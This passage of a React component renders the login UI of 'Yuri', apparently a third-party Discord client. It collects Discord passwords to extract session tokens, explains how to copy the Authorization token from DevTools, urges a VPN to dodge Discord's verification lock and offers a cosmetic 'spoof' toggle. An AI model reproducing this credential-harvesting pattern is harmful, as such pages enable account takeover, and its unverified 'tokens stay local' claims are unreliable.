                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-red-600 hover:bg-red-500 text-white font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-lg shadow-red-950/40"
                  >
                    {loading ? 'Authenticating...' : 'Enter Yuri Dashboard'}
                  </button>
                </form>
              ) : activeTab === 'email' ? (
                <form onSubmit={handleEmailSubmit} className="space-y-4">
                  <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-3 flex gap-2.5 text-red-200">
                    <ShieldAlert className="w-4 h-4 shrink-0 text-red-400 mt-0.5" />
                    <div className="text-xs">
                      <p className="font-semibold text-red-400">VPN Recommended:</p>
                      <p>Enable VPN before logging in with email/password to prevent Discord verification lock.</p>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Discord Email"
                      className="w-full px-4 py-3 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm"
                      required
                    />
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Discord Password"
                      className="w-full px-4 py-3 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm"
                      required
                    />
                  </div>

                  {copySuccess && (
                    <div className="text-emerald-400 text-xs text-center font-medium bg-emerald-500/10 py-2 px-3 rounded-lg border border-emerald-500/20 flex items-center justify-center gap-2">
                      <Check className="w-3.5 h-3.5" />
                      <span>Token extracted &amp; copied! Logging in...</span>
                    </div>
                  )}

                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-red-600 hover:bg-red-500 text-white font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-lg shadow-red-950/40 flex items-center justify-center gap-2"
                  >
                    {loading && <span className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin"/>}
                    <span>{loading ? 'Extracting & Logging in...' : 'Extract Token & Login'}</span>
                  </button>
                </form>
              ) : (
                <div className="space-y-4 text-xs text-zinc-400 bg-black/40 p-4 rounded-xl border border-white/5">
                  <p className="font-semibold text-white text-sm">How to get your Discord token:</p>
                  <ol className="list-decimal list-outside ml-4 space-y-2 font-sans">
                    <li>Open Discord in your browser and sign in.</li>
                    <li>Press <code className="bg-zinc-800 text-zinc-200 px-1 py-0.5 rounded font-mono">Ctrl + Shift + I</code> to open DevTools.</li>
                    <li>Click the <span className="text-zinc-200 font-medium">Network</span> tab.</li>
                    <li>Press <code className="bg-zinc-800 text-zinc-200 px-1 py-0.5 rounded font-mono">F5</code> to reload.</li>
                    <li>Filter by <code className="bg-zinc-800 text-red-300 px-1 py-0.5 rounded font-mono">/api/v9/users/@me</code>.</li>
                    <li>Select the request and find <span className="text-zinc-200 font-medium">Authorization</span> under Request Headers.</li>
                  </ol>
                </div>
              )}

              {/* TOS Checkbox */}
              <div className="mt-6 pt-4 border-t border-white/5">
                <label className="flex items-center gap-2.5 cursor-pointer group">
                  <div className="relative flex items-center justify-center">
                    <input 
                      type="checkbox" 
                      className="sr-only" 
                      checked={termsAccepted}
                      onChange={(e) => handleAcceptTerms(e.target.checked)}
                    />
                    <div className={`w-4 h-4 rounded border flex items-center justify-center transition-all ${termsAccepted ? 'bg-red-600 border-red-600' : 'bg-black/40 border-white/20 group-hover:border-white/40'}`}>
                      {termsAccepted && <Check className="w-3 h-3 text-white" />}
                    </div>
                  </div>
                  <p className="text-[11px] text-zinc-400 select-none">
                    I agree to Yuri's <button type="button" onClick={(e) => { e.preventDefault(); setShowTermsModal(true); }} className="text-zinc-300 hover:text-white underline transition-colors cursor-pointer">Terms of Service</button> and <button type="button" onClick={(e) => { e.preventDefault(); setShowPrivacyModal(true); }} className="text-zinc-300 hover:text-white underline transition-colors cursor-pointer">Privacy Policy</button>.
                  </p>
                </label>
              </div>

              <div className="mt-4 text-center">
                <button
                  type="button"
                  onClick={() => setShowAuthModal(false)}
                  className="text-xs text-zinc-500 hover:text-zinc-300 transition-colors cursor-pointer"
                >
                  ← Return to Overview
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Terms Modal */}
      <AnimatePresence>
        {showTermsModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <h3 className="text-lg font-semibold text-white">Terms of Service</h3>
                <button onClick={() => setShowTermsModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 rounded-lg cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3">
                <p>
                  <strong>1. Acceptance of Terms:</strong> By accessing or using Yuri, you confirm that you have read, understood, and agreed to be bound by these Terms of Service.
                </p>
                <p>
                  <strong>2. Use of Service:</strong> Yuri is provided as a third-party application dashboard. You agree to use the service responsibly and in compliance with all applicable local, national, and international laws.
                </p>
                <p>
                  <strong>3. Interaction with Discord API and Potential Risks:</strong> Third-party clients and automation functionalities are strictly against Discord's Terms of Service. You acknowledge that you use Yuri at your entirely own personal risk.
                </p>
                <p>
                  <strong>4. Local Processing:</strong> Tokens are processed locally in your session and never stored or broadcast to remote third-party servers.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Privacy Policy Modal */}
      <AnimatePresence>
        {showPrivacyModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <h3 className="text-lg font-semibold text-white">Privacy Policy</h3>
                <button onClick={() => setShowPrivacyModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 rounded-lg cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3">
                <p>
                  <strong>1. Data Collection:</strong> When you use Yuri and authenticate, your Discord token is stored entirely locally on your device within your browser's local storage or memory. We do not transmit tokens to any third-party databases.
                </p>
                <p>
                  <strong>2. Data Usage:</strong> Your tokens are strictly used to authenticate your session directly with the Discord API to enable the features within the Yuri dashboard.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* VPN Modal */}
      <AnimatePresence>
        {showVpnModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-md bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-full bg-red-500/20 flex items-center justify-center text-red-400">
                    <Globe className="w-4 h-4" />
                  </div>
                  <div>
                    <h3 className="text-sm font-semibold text-white">Yuri Routing Shield</h3>
                    <p className="text-[11px] text-zinc-400">Spoof connection node &amp; gateway</p>
                  </div>
                </div>
                <button onClick={() => setShowVpnModal(false)} className="p-1.5 text-zinc-400 hover:text-white bg-white/5 rounded-lg cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="p-5 space-y-3 overflow-y-auto custom-scrollbar">
                <div className="relative">
                  <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={vpnSearch}
                    onChange={(e) => setVpnSearch(e.target.value)}
                    placeholder="Search locations..."
                    className="w-full bg-zinc-900 border border-white/10 rounded-xl py-2.5 pl-9 pr-4 text-xs text-zinc-200 focus:outline-none focus:border-red-500/50"
                  />
                </div>

                <div className="space-y-1.5">
                  {VPN_COUNTRIES.filter(c => c.name.toLowerCase().includes(vpnSearch.toLowerCase()) || c.id.toLowerCase().includes(vpnSearch.toLowerCase())).map((country) => (
                    <button
                      key={country.id}
                      onClick={() => setVpnCountry(country)}
                      className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all cursor-pointer ${
                        vpnCountry.id === country.id 
                          ? 'bg-red-500/10 border-red-500/30' 
                          : 'bg-zinc-900/60 border-transparent hover:bg-zinc-800'
                      }`}
                    >
                      <div className="flex items-center gap-2.5">
                        <span className="text-lg">{country.flag}</span>
                        <span className="text-xs font-medium text-zinc-200">{country.name}</span>
                      </div>
                      <div className="flex items-center gap-2.5">
                        <span className="text-[11px] text-zinc-500 font-mono">{country.latency}</span>
                        <div className={`w-2.5 h-2.5 rounded-full border-2 ${vpnCountry.id === country.id ? 'border-red-500 bg-red-500' : 'border-zinc-700'}`} />
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div className="p-4 border-t border-white/5 bg-zinc-900/50">
                <button
                  onClick={() => {
                    setVpnEnabled(!vpnEnabled);
                    if (!vpnEnabled) setTimeout(() => setShowVpnModal(false), 500);
                  }}
                  className={`w-full py-3 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer ${
                    vpnEnabled 
                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
                      : 'bg-red-600 text-white hover:bg-red-500'
                  }`}
                >
                  <Shield className="w-4 h-4" />
                  {vpnEnabled ? 'Connected via ' + vpnCountry.name : 'Activate Node Shield'}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Community Server Modal */}
      <AnimatePresence>
        {showCommunityModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} 
              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-md bg-zinc-950 border border-[#5865F2]/20 rounded-3xl shadow-2xl overflow-hidden flex flex-col relative p-6 text-center"
            >
              <button 
                onClick={() => setShowCommunityModal(false)} 
                className="absolute top-4 right-4 p-1.5 text-zinc-400 hover:text-white bg-white/5 rounded-full cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="w-16 h-16 mx-auto rounded-2xl bg-[#5865F2]/20 border border-[#5865F2]/40 flex items-center justify-center text-[#5865F2] mb-4">
                <MessageSquare className="w-8 h-8" />
              </div>

              <h3 className="text-xl font-bold text-white mb-1">Official Yuri Community</h3>
              <p className="text-xs text-zinc-400 mb-6 max-w-xs mx-auto">
                Join our private community for Lua script drops, fast-track whitelisting, and real-time announcements.
              </p>

              <button
                onClick={handleCopyCommunityLink}
                className={`w-full py-3.5 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer ${
                  communityCopied 
                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
                    : 'bg-[#5865F2] text-white hover:bg-[#4752C4]'
                }`}
              >
                {communityCopied ? (
                  <>
                    <Check className="w-4 h-4 text-emerald-400" />
                    <span>Copied &amp; Opening Server!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4" />
                    <span>Copy Link &amp; Join Discord</span>
                  </>
                )}
              </button>

              <div className="mt-4 text-[11px] font-mono text-zinc-500">
                discord.gg/z5BwKZwtVe
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
